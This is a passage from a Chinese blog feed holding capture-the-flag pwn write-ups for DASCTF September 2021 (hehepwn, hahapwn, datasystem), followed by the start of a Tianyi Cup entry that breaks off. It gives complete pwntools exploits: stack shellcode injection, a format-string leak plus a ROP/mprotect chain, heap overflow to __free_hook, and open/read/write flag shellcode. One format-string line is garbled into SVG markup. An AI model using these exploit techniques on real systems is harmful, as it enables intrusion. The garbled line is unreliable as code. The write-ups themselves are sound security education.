    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个比赛其实是没抱着很认真的态度去打的，可能由于一贯的印象，下意识觉得安恒月赛，不是我这种小菜鸡能看的，毕竟从去年年尾学到现在，这种比赛我都是来凑人头的。但是这次，可惜了，后面看了下师傅的wp，发现，竟然不难，所以出篇博客复现一下吧，这是到目前为止，唯一全部pwn题都是我能做的了，也许，这就是进步了吧，岁月漫长，值得期待！</p><p>来源：<a href="http://rencvn.top/2021/09/26/PWN32/">http://rencvn.top/2021/09/26/PWN32/</a></p><p><a href="https://www.cnblogs.com/LynneHuan/p/15335597.html">https://www.cnblogs.com/LynneHuan/p/15335597.html</a></p><h2 id="hehepwn"><a href="#hehepwn" class="headerlink" title="hehepwn"></a>hehepwn</h2><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152753508.png" alt="image-20210928152753508"></p><p>常规checksec，64位保护全没开，第一想法就是执行shellcode</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152907622.png" alt="image-20210928152907622"></p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152921816.png" alt="image-20210928152921816"></p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152851336-16328141798011.png" alt="image-20210928152851336"></p><p>首先，会有个输入点，并且还会打印我们输入的内容，只要我们输入满0x20个字符，就会连着rbp一起泄露出来，获取到栈上地址，后面还贴心的给了栈溢出。</p><p>那就明确了：栈上写入shellcode，借用得到来的栈上地址算出shellcode写入的地址，将这个地址填充到返回地址去，然后执行shellcode</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928153222539.png" alt="image-20210928153222539"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./bypwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29608</span>)<br>p.recvuntil(<span class="hljs-string">&quot;well you input:\n&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *main&quot;)</span><br>stack_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;stack_addr==&gt;0x%x&quot;</span> %stack_addr)<br>p.recvuntil(<span class="hljs-string">&quot;EASY PWN PWN PWN~\n&quot;</span>)<br>shellcode = asm(shellcraft.sh())<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode)))<br>payload = shellcode.ljust(<span class="hljs-number">88</span>, <span class="hljs-string">&#x27;a&#x27;</span>) + p64(stack_addr - <span class="hljs-number">80</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="hahapwn"><a href="#hahapwn" class="headerlink" title="hahapwn"></a>hahapwn</h2><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145300688.png" alt="image-20210928145300688"></p><p>常规checksec，64位，没开PIE，RELRO也没开全</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145345926.png" alt="image-20210928145345926"></p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145402864.png" alt="image-20210928145402864"></p><p>程序也十分简单，但是开了沙箱，所以是orw。给了格式化字符串，用来泄露canary的，以及一个明显栈溢出。</p><p>所以思路很明确的，也很简单，就是通过格式化字符串泄露出canary，其实由于长度够，还能再多泄露一个寄存器或者栈上存储的函数地址，从而获取libc地址，然后呢，这边泄露的选择寄存器上的没问题，刚开始我是选择栈上的stdin，然后发现远程这个打印出来是空的</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152412946.png" alt="image-20210928152412946"></p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152432248.png" alt="image-20210928152432248"></p><p>换成寄存器上的libc地址就行了。拥有了libc和canary后就可以着手布置rop了，我的做法是使用mprotect修改权限然后跳转到read函数进行写入shellcode，最后跳转shellcode执行读取flag。师傅的做法就是直接用rop进行open，read，write的调用读取flag</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152051899.png" alt="image-20210928152051899"></p><p>这题有点坑，看了师傅的wp也知道了，环境有点问题，官方给的附件里的libc版本是跟远程靶机差了一个小版本的，把libc换成2.23-0ubuntu11.3即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;libc.so.6&#x27;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27901</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *main&quot;)</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Welcome! What is your name?\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;%3<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="1.259ex" height="2.009ex" style="vertical-align: -0.671ex; margin-left: -0.089ex;" viewbox="-38.5 -576.1 542 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title"><title id="MathJax-SVG-1-Title">p%27</title><defs aria-hidden="true"><path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true"> <use xlink:href="#E1-MJMATHI-70" x="0" y="0"/></g></svg>p&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0xf73c0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;canary==&gt;0x%x&quot;</span> %canary)<br>p.recvuntil(<span class="hljs-string">&quot;What can we help you?\n&quot;</span>)<br>mprotect = libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>] + libc_base <br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000021112</span><br>pop_rsi = libc_base + <span class="hljs-number">0x00000000000202f8</span><br>pop_rdx = libc_base + <span class="hljs-number">0x0000000000001b92</span><br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>bss = <span class="hljs-number">0x601000</span><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(pop_rdi) + p64(bss) <br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(bss + <span class="hljs-number">0x80</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x100</span>) + p64(read)<br>payload += p64(bss + <span class="hljs-number">0x80</span>)<br>shellcode = asm(<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>) <br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.1</span>)<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="datasystem"><a href="#datasystem" class="headerlink" title="datasystem"></a>datasystem</h2><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928153319183.png" alt="image-20210928153319183"></p><p>checksec，64位保护全开</p><p>这题是三题里面最复杂的一题，因为在进入真正的程序前，有一个登陆程序，比较复杂，需要花时间进行审计</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928154615068.png" alt="image-20210928154615068"></p><p>开了沙箱</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928162959918.png" alt="image-20210928162959918"></p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928163032723.png" alt="image-20210928163032723"></p><p>一进入，要先输入账号和密码通过验证，验证通过才能进入真正的有漏洞的程序。账号已经给：admin；密码要自己去找</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928165344870.png" alt="image-20210928165344870"></p><p>我先断点断在比较函数那，看看最终比较的值，第一个参数是我们输入的（原本输入的是八个a），第二个就是要比较的密码。然后我把下一次输入的值换成这个密码</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928165946197.png" alt="image-20210928165946197"></p><p>发现，第二个参数的第一个字符变成了0，那不是截断了吗？但是并没有通过验证，然后我去c代码敲了下，原来是要两个字符串同时都是’\x00’才会通过比较，一个是不行的~</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928170846837.png" alt="image-20210928170846837"></p><p>然后又试了一些随便输入的密码，惊讶的发现，得到的验证密码结果都是一样的，只有复制的密码那次会出现0，看了下wp，大佬推测是位数的问题，只有32位的数字才能让密码为0，我试了下确实是这样的，接下来就是寻找一个可以也让我们输入的密码被加密成首位是’\x00’就可以通过验证</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;error&quot;</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>    c = c.to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;big&#x27;</span>)<br>    p = process(<span class="hljs-string">&#x27;./datasystem&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;please input username: &quot;</span>, <span class="hljs-string">&quot;admin\x00&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;please input password: &quot;</span>, c*<span class="hljs-number">32</span>)<br>    msg = p.recvline()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Fail&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> msg:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a valid char:&quot;</span>, c)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>)<br>    p.close()<br></code></pre></td></tr></table></figure><p>这是大佬的爆破脚本，最终获得两个可以通过的值：’c’和’\xec’。然后大佬是用IDA调试的，我以前有尝试过，但是无奈一直报错，但是gdb调试也是一样的，没差</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928171601841.png" alt="image-20210928171601841"></p><p>进入下一个程序了</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928190830374.png" alt="image-20210928190830374"></p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928190852013.png" alt="image-20210928190852013"></p><p>这边v3返回值因为%s的缘故会把byte_50A0指向的字符全部作为欲写入的字符，而byte_50A0可以查看，全都是a，似乎有0x508个，所以这边在add写入的内容是溢出的。</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928193027743.png" alt="image-20210928193027743"></p><p>万事先泄露libc，这边要先申请再释放一个0x410的堆块，防止进入tcache bin中，然后再申请的得是0x8大小的堆块，因为snprinf会打印个数进去，不能超过八个，否则会把上面残留的bk指针破坏，从而可以泄露出libc地址</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928193842290.png" alt="image-20210928193842290"></p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928194236357.png" alt="image-20210928194236357"></p><p>然后再反序释放三个堆块，申请回来，就会让上面的堆块是最先被申请的，然后通过溢出把堆块分配到0x23330000写入shellcode，之前再来一遍把fd指针为free_hook，申请过去改为shellcode地址，然后释放一个堆块就会跳转执行shellcode了</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928200129108.png" alt="image-20210928200129108"></p><p>成功！</p><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928203049261.png" alt="image-20210928203049261"></p><p>不容易，有朝一日我这小菜鸡竟然能赛后“ak”，泪目！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./datasystem&quot;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./datasystem&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27961</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Size: \n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;what&#x27;s your Content: \n&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;Content:\n&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.recvuntil(<span class="hljs-string">&quot;please input username: &quot;</span>)<br>p.send(<span class="hljs-string">&quot;admin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;please input password: &quot;</span>)<br>p.send(<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x410</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;c&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ec090</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x23330000</span>)<br>shellcode = asm(<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdi, 0x23330000</span><br><span class="hljs-string">xor rsi, rsi</span><br><span class="hljs-string">mov rax, 2</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, rax</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">mov rdx, 0x50</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 1</span><br><span class="hljs-string">mov rax, 1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>)<br>add(<span class="hljs-number">0x60</span>, payload)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span> + shellcode)<br><br>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x21</span>) + p64(free_hook))<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>, p64(<span class="hljs-number">0x23330000</span> + <span class="hljs-number">0x8</span>))<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这个比赛其实是没抱着很认真的态度去打的，可能由于一贯的印象，下意识觉得安恒月赛，不是我这种小菜鸡能看的，毕竟从去年年尾学到现在，这种比赛我都</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2021天翼杯PWN</title>
    <link href="http://example.com/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/"/>
    <id>http://example.com/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/</id>
    <published>2021-09-26T01:09:37.000Z</published>
    <updated>2021-10-13T08:01:24.742Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太菜了，一题没出；又是抱着大佬WP跟着复现~</p><p>来源：<a href="http://www.darry-long.top/2021/09/23/2021-%E5%A4%A9%E7%BF%BC%E6%9D%AF-pwn/">http://www.darry-long.top/2021/09/23/2021-%E5%A4%A9%E7%BF%BC%E6%9D%AF-pwn/</a></p><h2 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h2><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926091254408.png" alt="image-20210926091254408"></p><p>常规checksec，64位保护全开</p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926100956854.png" alt="image-20210926100956854"></p><p>第一次进行比较长的代码审计，对我来说还是比较困难的，基本上都是跟着大佬的注释边写边考虑逻辑</p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926101234190.png" alt="image-20210926101234190"></p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926101445271.png" alt="image-20210926101445271"></p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926110301065-16326298376511.png" alt="image-20210926110301065"></p><p>这保存的是一个单链表结构，在每个申请出来的堆块上的0x210保存在前一个堆块的地址，在0x208处保存着当前堆块可写入的数据的长度，所以是存在堆溢出的，修改了size就可以修改保存堆块的地址，变成任意地址写或者修改下一块堆块的堆头、fd\bk指针等。因为是单向链表结构，所以是一个一个追溯的，越晚申请的堆块序号越靠前，但是在堆上的地址其实是靠后的</p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926121301503.png" alt="image-20210926121301503"></p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926121807097.png" alt="image-20210926121807097"></p><p>最终在我本地调为符合one_gadget的环境要求，可是不知道为什么最终却没有getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 